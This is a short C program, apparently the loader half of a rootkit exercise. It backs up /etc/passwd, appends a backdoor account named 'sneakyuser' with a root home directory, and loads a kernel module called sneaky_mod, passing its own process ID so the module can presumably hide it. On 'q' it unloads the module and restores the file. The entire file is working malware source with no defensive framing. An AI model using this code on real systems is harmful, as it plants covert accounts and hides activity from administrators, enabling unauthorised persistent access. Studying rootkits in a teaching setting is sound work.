/**
 * This program do the following:
 * 1. print its pid
 * 2. copy passwd file into a new file
 * 3. load sneaky module
 * 4. loop until user input 'q'
 * 5. unload module
 * 6. restore the passwd file
 **/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main() {
    printf("sneaky_process pid = %d\n", getpid());
    system("cp /etc/passwd /tmp"); //success
    system("echo sneakyuser:abc123:2000:2000:sneakyuser:/root:bash >> /etc/passwd"); 
    //load
    char buffer[40]; //sprintf 39b, insmod 27b
    sprintf(buffer, "insmod sneaky_mod.ko pid=%d", getpid());
    system(buffer);
    char input;
    while ((input = getchar()) != 'q');
    system("rmmod sneaky_mod.ko");
    system("cp /tmp/passwd /etc");
    return EXIT_SUCCESS;
}